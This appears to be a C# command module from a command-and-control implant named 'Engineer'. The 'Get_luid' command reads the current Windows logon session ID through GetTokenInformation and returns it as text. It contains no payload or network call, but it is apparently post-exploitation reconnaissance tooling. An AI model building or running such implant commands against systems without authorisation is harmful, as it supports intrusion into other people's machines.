using Engineer.Commands;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Engineer.Extra;
using static Engineer.Extra.WinAPIs.WinNT;
using System.IO;

namespace Engineer.Commands
{
    internal class GetLuid : EngineerCommand
    {
        public override string Name => "Get_luid";

        public override string Execute(EngineerTask task)
        {
            var stdOut = Console.Out;
            var stdErr = Console.Error;
            var ms = new MemoryStream();
            StreamWriter writer = new StreamWriter(ms) { AutoFlush = true };
            Console.SetOut(writer);
            Console.SetError(writer);
            try
            {
                return ("[*] Current LogonID (LUID) : " + GetCurrentLUID() + " " + "(" + (UInt64)GetCurrentLUID() + ")" + "\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine("error: " + ex.Message);
            }
            finally
            {
                //reset the console out and error
                Console.SetOut(stdOut);
                Console.SetError(stdErr);
            }
            string Output = Encoding.UTF8.GetString(ms.ToArray());
            return Output;
        }
        public static _LUID GetCurrentLUID()
        {
                // helper that returns the current logon session ID by using GetTokenInformation w/ TOKEN_INFORMATION_CLASS
                var TokenInfLength = 0;
                var luid = new _LUID();

                // first call gets lenght of TokenInformation to get proper struct size
                var Result = WinAPIs.Advapi.GetTokenInformation(WindowsIdentity.GetCurrent().Token, WinAPIs.Advapi.TOKEN_INFORMATION_CLASS.TokenStatistics, IntPtr.Zero, TokenInfLength, out TokenInfLength);

                var TokenInformation = Marshal.AllocHGlobal(TokenInfLength);

                // second call actually gets the information
                Result = WinAPIs.Advapi.GetTokenInformation(WindowsIdentity.GetCurrent().Token, WinAPIs.Advapi.TOKEN_INFORMATION_CLASS.TokenStatistics, TokenInformation, TokenInfLength, out TokenInfLength);

                if (Result)
                {
                    var TokenStatistics = (WinAPIs.WinNT._TOKEN_STATISTICS)Marshal.PtrToStructure(TokenInformation, typeof(WinAPIs.WinNT._TOKEN_STATISTICS));
                    luid = new _LUID(TokenStatistics.AuthenticationId);
                }
                else
                {
                    var lastError = WinAPIs.Kernel32.GetLastError();
                    Console.WriteLine("[X] GetTokenInformation error: {0}", lastError);
                    Marshal.FreeHGlobal(TokenInformation);
                }
                return luid;
        }
    }
}
